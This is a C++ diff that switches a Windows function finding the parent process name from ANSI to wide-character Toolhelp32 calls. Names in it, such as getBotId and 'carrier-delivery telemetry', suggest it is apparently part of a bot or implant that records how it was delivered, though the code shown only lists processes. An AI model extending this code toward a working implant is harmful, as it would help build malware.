@@ -241,27 +241,27 @@ static std::string getBotId() {
 }
 
 // ─── parent process name (for carrier-delivery telemetry) ────────────────────
+// Uses W variants — MinGW does not always expose the explicit A variants.
 static std::string getParentProcName() {
     DWORD myPid = GetCurrentProcessId(), ppid = 0;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return "unknown";
-    PROCESSENTRY32A pe{ sizeof(pe) };
-    // Find our own PPID
-    if (Process32FirstA(snap, &pe)) {
+    PROCESSENTRY32W pe{ sizeof(pe) };
+    if (Process32FirstW(snap, &pe)) {
         do {
             if (pe.th32ProcessID == myPid) { ppid = pe.th32ParentProcessID; break; }
-        } while (Process32NextA(snap, &pe));
+        } while (Process32NextW(snap, &pe));
     }
-    // Find parent's exe name
-    if (ppid && Process32FirstA(snap, &pe)) {
+    if (ppid && Process32FirstW(snap, &pe)) {
         do {
             if (pe.th32ProcessID == ppid) {
                 CloseHandle(snap);
-                std::string n(pe.szExeFile);
+                std::wstring ws(pe.szExeFile);
+                std::string n(ws.begin(), ws.end());
                 for (auto& c : n) c = (char)tolower((unsigned char)c);
                 return n;
             }
-        } while (Process32NextA(snap, &pe));
+        } while (Process32NextW(snap, &pe));
     }
     CloseHandle(snap);
     return "unknown";
